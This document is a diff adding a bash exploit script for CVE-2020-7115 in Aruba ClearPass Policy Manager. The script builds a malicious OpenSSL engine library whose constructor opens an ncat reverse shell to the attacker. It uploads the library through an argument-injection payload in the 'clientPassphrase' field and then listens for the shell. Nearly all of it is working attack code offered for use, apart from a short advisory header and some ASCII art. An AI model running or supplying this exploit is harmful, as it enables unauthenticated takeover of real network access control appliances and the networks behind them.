@@ -1,0 +1,49 @@
+# Exploit Title: Aruba ClearPass Policy Manager 6.7.0 - Unauthenticated Remote Command Execution
+# Date: 2020-07-06
+# Exploit Author: SpicyItalian
+# Vendor Homepage: https://www.arubanetworks.com/products/security/network-access-control/
+# Version: ClearPass 6.7.x prior to 6.7.13-HF, ClearPass 6.8.x prior to 6.8.5-HF, ClearPass 6.9.x prior to 6.9.1
+# Tested on: ClearPass 6.7.0
+# CVE: CVE-2020-7115
+
+Use of RHEL/CentOS 7.x is recommended to successfully generate the malicious OpenSSL engine.
+
+#!/usr/bin/env bash
+
+if [ "$#" -ne 4 ]; then
+echo "Usage: `basename $0` [remote host] [remote port] [local host] [local port]"
+exit 0
+fi
+cat <<EOF >>payload.c
+#include <unistd.h>
+__attribute__((constructor))
+static void init() {
+execl("/bin/sh", "sh", "-c", "rm -f /tmp/clientCertFile*.txt ; sleep 1 ; ncat $3 $4 -e /bin/sh", NULL);
+}
+EOF
+
+gcc -fPIC -c payload.c
+gcc -shared -o payload.so -lcrypto payload.o
+rm -f payload.c payload.o
+curl -X POST -F 'clientPassphrase=req -engine /tmp/clientCertFile*.txt' -F 'uploadClientCertFile=@./payload.so' -k https://$1:$2/tips/tipsSimulationUpload.action &>/dev/null &
+cat <<"EOF"
+
+/(\
+
+¡ !´\
+
+| )\ `.
+
+| `.) \,-,--
+
+( / /
+
+`'-.,;_/
+
+`----
+
+EOF
+
+printf "\nPleasea waita for your spicy shell...\n\n"
+
+ncat -v -l $3 $4
